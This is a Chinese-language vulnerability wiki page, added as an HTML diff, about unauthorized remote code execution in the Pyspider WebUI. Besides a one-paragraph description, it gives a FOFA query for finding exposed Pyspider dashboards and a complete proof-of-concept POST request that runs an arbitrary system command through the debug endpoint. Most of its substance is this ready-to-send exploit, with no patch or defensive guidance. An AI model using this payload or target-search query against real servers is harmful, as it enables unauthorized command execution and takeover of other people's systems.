@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Pyspider%20WebUI/Pyspider-WebUI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Pyspider WebUI未授权访问致远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Pyspider-WebUI\u672a\u6388\u6743\u8bbf\u95ee\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "poc", url: "#poc", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Pyspider-WebUI/Pyspider-WebUI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Pyspider-WebUI/Pyspider-WebUI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Pyspider WebUI未授权访问致远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-link">
+        pyspider未授权访问
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="pyspider-webui">Pyspider-WebUI未授权访问致远程代码执行漏洞<a class="headerlink" href="#pyspider-webui" title="Permanent link">&para;</a></h2>
+<p>由于Pyspider WebUI未进行合理的访问控制，默认允许远程攻击者未授权访问webui界面，且系统内部存在python脚本在线编辑并运行的模块，导致未经身份验证的攻击者可远程执行python代码调用系统命令来获取服务器权限。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">title=&quot;Dashboard - pyspider&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="l l-Scalar l-Scalar-Plain">POST /debug/任意实例名/run HTTP/1.1</span>
+<span class="l l-Scalar l-Scalar-Plain">Host</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">your-ip</span>
+<span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0</span>
+<span class="nt">Accept</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="nt">Accept-Language</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="nt">Accept-Encoding</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gzip, deflate, br</span>
+<span class="nt">Content-Type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application/x-www-form-urlencoded</span>
+<span class="nt">Connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">close</span>
+
+<span class="l l-Scalar l-Scalar-Plain">webdav_mode=false&amp;script=import+os%0D%0A%0D%0Aprint%28os.system%28%27执行的命令%27%29%29&amp;task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D</span>
+</code></pre></div>
+<p><img alt="img" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407092258892.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Pyspider-WebUI/Pyspider-WebUI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Pyspider-WebUI/Pyspider-WebUI%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Pyspider WebUI未授权访问致远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Pyspider/pyspider%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="btn btn-xs btn-link">
+        pyspider未授权访问
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
